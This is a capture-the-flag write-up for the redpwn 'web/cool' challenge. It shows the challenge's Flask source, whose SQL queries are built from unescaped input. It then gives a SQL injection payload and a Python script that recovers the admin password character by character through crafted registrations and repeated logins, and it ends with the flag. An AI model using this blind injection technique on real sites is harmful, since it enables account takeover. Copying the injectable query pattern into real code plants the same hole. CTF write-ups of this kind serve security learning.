# web/cool (125 solves / 122 points)
## Description: 
Aaron has a message for the cool kids. For support, DM BrownieInMotion.
[cool.mc.ax](https://cool.mc.ax/)
Downloads:
[app.py](https://static.redpwn.net/uploads/e03916d52bb7e84cbd2f9f26e5de162fdd0442c40d8397a103aab5813031fd83/app.py)
## Solution:
Source code:

	from flask import (
    		Flask,
    		request,
    		render_template_string,
    		session,
    		redirect,
    		send_file
	)
	from random import SystemRandom
	import sqlite3
	import os
	
	app = Flask(__name__)
	app.secret_key = os.getenv('FLASK_KEY')
	
	rand = SystemRandom()
	
	allowed_characters = set(
		'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789'
	)
	
	
	def execute(query):
		con = sqlite3.connect('db/db.sqlite3')
		cur = con.cursor()
		cur.execute(query)
    		con.commit()
	return cur.fetchall()
	
	
	def generate_token():
		return ''.join(
        	rand.choice(list(allowed_characters)) for _ in range(32)
    	)
	
	
	def create_user(username, password):
		if any(c not in allowed_characters for c in username):
        		return (False, 'Alphanumeric usernames only, please.')
    		if len(username) < 1:
        		return (False, 'Username is too short.')
    		if len(password) > 50:
        		return (False, 'Password is too long.')
    		other_users = execute(
        		f'SELECT * FROM users WHERE username=\'{username}\';'
    		)
    		if len(other_users) > 0:
        		return (False, 'Username taken.')
    		execute(
        		'INSERT INTO users (username, password)'
        		f'VALUES (\'{username}\', \'{password}\');'
    		)
    		return (True, '')
	
	
	def check_login(username, password):
    		if any(c not in allowed_characters for c in username):
        		return False
    	correct_password = execute(
        	f'SELECT password FROM users WHERE username=\'{username}\';'
    	)
    	if len(correct_password) < 1:
        	return False
    	return correct_password[0][0] == password
	
	
	@app.route('/', methods=['GET', 'POST'])
	def login():
    	error = ''
    	if request.method == 'POST':
        	valid_login = check_login(
            	request.form['username'],
            	request.form['password']
        	)
        	if valid_login:
            		session['username'] = request.form['username']
            		return redirect('/message')
        	error = 'Incorrect username or password.'
    		if 'username' in session:
        		return redirect('/message')
    			return render_template_string('''
		<link rel="stylesheet" href="/static/style.css" />
		<div class="container">
		    <p>Log in to see Aaron's message!</p>
		    <form method="POST">
			<label for="username">Username</label>
			<input type="text" name="username" />
			<label for="password">Password</label>
			<input type="password" name="password" />
			<input type="submit" value="Log In" />
		    </form>
		    <p>{{ error }}</p>
		    <a href="/register">Register</a>
		<div class="container">
	    ''', error=error)


	@app.route('/register', methods=['GET', 'POST'])
	def register():
	    message = ''
	    if request.method == 'POST':
		success, message = create_user(
		    request.form['username'],
		    request.form['password']
		)
		if success:
		    session['username'] = request.form['username']
		    return redirect('/message')
	    return render_template_string('''
		<link rel="stylesheet" href="/static/style.css" />
		<div class="container">
		    <p>Register!</p>
		    <form method="POST">
			<label for="username">Username</label>
			<input type="text" name="username" />
			<label for="password">Password</label>
			<input type="password" name="password" />
			<input type="submit" value="Register" />
		    </form>
		    <p>{{ error }}</p>
		</div>
	    ''', error=message)


	@app.route('/message')
	def message():
	    if 'username' not in session:
		return redirect('/')
	    if session['username'] == 'ginkoid':
		return send_file(
		    'flag.mp3',
		    attachment_filename='flag-at-end-of-file.mp3'
		)
	    return '''
		<link rel="stylesheet" href="/static/style.css" />
		    <div class="container">
		    <p>You are logged in!</p>
		    <p>Unfortunately, Aaron's message is for cool people only.</p>
		    <p>(like ginkoid)</p>
		    <a href="/logout">Log out</a>
		</div>
	    '''


	@app.route('/logout')
	def logout():
	    if 'username' not in session:
		return redirect('/')
	    del session['username']
	    return redirect('/')


	def init():
	    # this is terrible but who cares
	    execute('''
		CREATE TABLE IF NOT EXISTS users (
		    username TEXT PRIMARY KEY,
		    password TEXT
		);
	    ''')
	    execute('DROP TABLE users;')
	    execute('''
		CREATE TABLE users (
		    username TEXT PRIMARY KEY,
		    password TEXT
		);
	    ''')

	    # put ginkoid into db
	    ginkoid_password = generate_token()
	    execute(
		'INSERT OR IGNORE INTO users (username, password)'
		f'VALUES (\'ginkoid\', \'{ginkoid_password}\');'
	    )
	    execute(
		f'UPDATE users SET password=\'{ginkoid_password}\''
		f'WHERE username=\'ginkoid\';'
	    )


	init()


The website was a simple login+register function, and after looking at the source code, it was clear that in order to get the flag, I needed to log in as the admin user 'ginkoid'. The application uses a sqlite database to hold users. The usernames are only allowed to be alphanumeric, and the passwords can be composed of any characters, as long as they are shorter than 50 characters long. I was initially at a loss for what to do, as I couldn't find a way to create an error or time-based atack with only 50 characters. However, one of my teamates found that
it was possible to set a user's password to ginkoid's password using the following payload: `'|| (SELECT password FROM users)`. This gave me an idea. If I could set the entire password as a password, I could also use only one character of ginkoid's password using the following payload `'|| substr((SELECT password FROM users),1,1)`. After this was done, I could discern the password by trying to log in using every alphanumeric character, one at at a time, as the password. The letter or number that succeeded would be the letter/number that was in the password. I made a python to exploit this technique:

	import requests
	import numpy
	url2 = "https://cool.mc.ax/register"

	#payload2 = "username=dasdfasdf&password='||substr((SELECT+password+FROM+users),1,{}))--"
	headers2 = {
	  'Host': 'cool.mc.ax',
	  'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
	  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
	  'Accept-Language': 'en-US,en;q=0.5',
	  'Accept-Encoding': 'gzip, deflate',
	  'Content-Type': 'application/x-www-form-urlencoded',
	  'Content-Length': '74',
	  'Origin': 'https://cool.mc.ax',
	  'Connection': 'close',
	  'Referer': 'https://cool.mc.ax/register',
	  'Upgrade-Insecure-Requests': '1'
	}
	'''
	import logging

	# These two lines enable debugging at httplib level (requests->urllib3->http.client)
	# You will see the REQUEST, including HEADERS and DATA, and RESPONSE with HEADERS but without DATA.
	# The only thing missing will be the response.body which is not logged.
	try:
	    import http.client as http_client
	except ImportError:
	    # Python 2
	    import httplib as http_client
	http_client.HTTPConnection.debuglevel = 1

	# You must initialize logging, otherwise you'll not see debug output.
	logging.basicConfig()
	logging.getLogger().setLevel(logging.DEBUG)
	requests_log = logging.getLogger("requests.packages.urllib3")
	requests_log.setLevel(logging.DEBUG)
	requests_log.propagate = True
	'''
	url = "https://cool.mc.ax/"

	#payload = "username=dasdfasdf&password="
	headers = {
	  'Host': 'cool.mc.ax',
	  'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
	  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
	  'Accept-Language': 'en-US,en;q=0.5',
	  'Accept-Encoding': 'gzip, deflate',
	  'Content-Type': 'application/x-www-form-urlencoded',
	  'Content-Length': '38',
	  'Origin': 'https://cool.mc.ax',
	  'Connection': 'close',
	  'Referer': 'https://cool.mc.ax/',
	  'Upgrade-Insecure-Requests': '1'
	}

	#response = requests.request("POST", url, headers=headers, data=payload)

	#print(response.text)
	listCh = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
	password = "GRsduxoDN79azQ7mea1C8j1EcQK"
	while True:
	    tempUse = ''.join(numpy.random.choice(list(listCh)) for _ in range(32))
	    print(tempUse)
	    payload2 = "username={}&password='||substr((SELECT+password+FROM+users),1,{}))--"
	    payload2 = payload2.format(tempUse,len(password)+1)
	    response2 = requests.request("POST", url2, headers=headers2, data=payload2,allow_redirects=False)
	    for nChar in listCh:
		payload = "username={}&password={}"
		payload = payload.format(tempUse,password+nChar)
		response = requests.request("POST", url, headers=headers, data=payload,allow_redirects=False)
		print(password+nChar,response.status_code)
		if(response.status_code == 302):
		    password+=nChar
		    print("adding: "+nChar)
		    break

What this script does is create a user with a random username and make it's password the password we have gotten so far, as well as the next letter of ginkoid's password. It then tries to login with all the letters+numbers, and adds the correct letter/number to the password. I ran this script, and found the password. I logged in to the 'ginkoid' acount, and was presented with an mp3 file named 'flag-at-end-of-file.mp3'. Based off the name, I assumed the flag was at the end of the file, ran strings ons it, and got the following flag:
## Flag:
`flag{44r0n_s4ys_s08r137y_1s_c00l}`
